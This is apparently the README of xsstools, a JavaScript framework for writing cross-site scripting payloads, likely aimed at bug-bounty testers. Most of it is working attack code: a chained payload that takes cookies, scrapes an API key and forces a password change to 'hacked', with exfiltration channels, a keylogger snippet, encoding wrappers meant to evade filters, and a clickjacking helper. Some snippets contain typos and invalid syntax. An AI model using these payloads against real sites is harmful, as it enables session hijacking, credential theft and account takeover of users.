# xsstools

xsstools is an xss development frameworks, with the goal of making payload writing easier.


```html
<script type="module">
import {Exfiltrators, Payload, Wrapper, utils} from "./xsstools.min.js"

const exfiltrator = Exfiltrators.message()
const payload = Payload.new()
    .addExfiltrator(exfiltrator)
    .eval(() => document.cookie)
    .exfiltrate()
    .fetchDOM("/user/me")
    .querySelector("input[name='apikey']", 'value')
    .exfiltrate()
    .postUrlEncoded("/user/changePassword", {"password": "hacked"})


const wrapper = Wrapper.new()
    .evalB64()
    .svgLoad()
    .iframe()


const exploit = wrapper.wrap(payload)

const target = "http://vulnerable.domain", {"vulnerableParam": exploit}

window.open(target)
</script>
```

## Exfiltrators

A collection of exfiltrators is available 

* message: use postMessage
* get: use fetch GET
* post: use fetch POST urlencoded
* postJSON: use fetch POST json encoded
* sendBeacon: use navigator.sendBeacon
* console: for debugging, simply use console.log
* img: create an img tag to exfiltrate via GET
* style: create a style tag to exfiltrate via GET
* iframe: create an iframe tag to exfiltrate via GET

[https://yeswehack.github.io/xsstools/Exfiltrators.html](https://yeswehack.github.io/xsstools/Exfiltrators.html)


## Payload

Use the payload generator to quickly create powerfull payloads

```javascript
const Payload.new()
    .addExfiltrator(exfiltrator)
    .startKeyLogger()
    .fetchJSON("/api/user/me")
    .eval(r => r.email)
    .exfiltrate()
```
[https://yeswehack.github.io/xsstools/Payload.html](https://yeswehack.github.io/xsstools/Payload.html)


## Wrapper

Wrap your payload using one of the many available wrappers without worrying about encoding.

```javascript

const wapper = Wrapper.new()
    .minify()
    .templateString()
    .imgLoad()
    .innerHTML()
    .script()
    .iframe()


const payload = wrapper.wrap("alert(1)")
consoloe.log(payload)
```

[https://yeswehack.github.io/xsstools/Wrapper.html](https://yeswehack.github.io/xsstools/Wrapper.html)


## ClickJacker

Writing clickjacking code can be tedious, with xss tools you only need to supply the position of the targeted element.

```javascript
const cj = new ClickJacker(url)

cj.addStep({x: 42, y: 34, width: 64, height: 35})

await cj.run()
```


[https://yeswehack.github.io/xsstools/ClickJacker.html](https://yeswehack.github.io/xsstools/ClickJacker.html)


You can find the bounding box interactively using this code
```javascript 
(()=>{function e(e){e.classList.remove(o),l?e.onclick=l:c.removeEventListener("click",n)}function t({clientX:t,clientY:i}){const d=document.elementFromPoint(t,i);d!=c&&(d.classList.add(o),c&&e(c),d.onclick?(l=d.onclick,d.onclick=n):(l=null,d.addEventListener("click",n,{once:!0})),c=d)}function n(n){n.preventDefault(),n.stopPropagation();let{x:o,y:i,height:c,width:l}=n.target.getBoundingClientRect();[o,i,c,l]=[o,i,c,l].map(e=>+e.toFixed(2)),window.prompt("Bounding box",JSON.stringify({x:o,y:i,height:c,width:l})),e(n.target),window.removeEventListener("mousemove",t)}const o="xxx-selected",i=document.createElement("style");i.innerText=`.${o} {box-shadow: 0 0 0 1px red inset, 0 0 0 1px red;}`;let c=null,l=null;window.addEventListener("mousemove",t),document.body.appendChild(i)})();
```

# Documentation

You can read the documentation here:
[https://yeswehack.github.io/xsstools](https://yeswehack.github.io/xsstools)

Or generate it locally using `yarn docs`



# Example

A more complete example with a simple template page is available in /example


# Tests

If you want to know which payload is compatible with your targeted browser you can run the test suite in /test.


